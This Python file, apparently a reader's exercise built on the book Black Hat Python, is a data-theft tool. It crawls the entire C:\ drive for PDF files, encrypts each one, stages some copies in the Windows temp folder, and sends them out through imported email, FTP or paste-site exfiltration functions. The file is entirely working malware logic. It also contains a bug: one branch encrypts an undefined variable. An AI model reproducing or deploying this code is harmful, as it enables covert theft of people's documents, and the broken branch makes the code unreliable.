from cryptor import decrypt, encrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste
} # Exfil dictionary, to use functions as parameters (𝘥𝘪𝘴𝘤𝘵𝘪𝘰𝘯𝘢𝘳𝘺 𝘥𝘪𝘴𝘱𝘢𝘵𝘤𝘩)
  # [𝘐𝘯] 𝘗𝘺𝘵𝘩𝘰𝘯, 𝘧𝘶𝘯𝘤𝘵𝘪𝘰𝘯𝘴 𝘢𝘳𝘦 𝘧𝘪𝘳𝘴𝘵-𝘤𝘭𝘢𝘴𝘴 𝘤𝘪𝘵𝘪𝘻𝘦𝘯𝘴 𝘢𝘯𝘥 𝘤𝘢𝘯 𝘣𝘦 𝘶𝘴𝘦𝘥 𝘢𝘴 𝘱𝘢𝘳𝘢𝘮𝘦𝘵𝘦𝘳𝘴. - Black Hat Python (p.149)
  
def find_docs(doc_type='pdf'):
    # Walks through the file system, looking for PDFs
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path
                # if PDF, get path and yield back to caller

def exfiltrate(document_path, method):
    if method in['transmit', 'plain_ftp']:
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0:
            content = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(content))
        
        EXFIL[method](filename)
        os.unlink(filename)
    else:
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        content =  encrypt(content)
        EXFIL[method](title, content)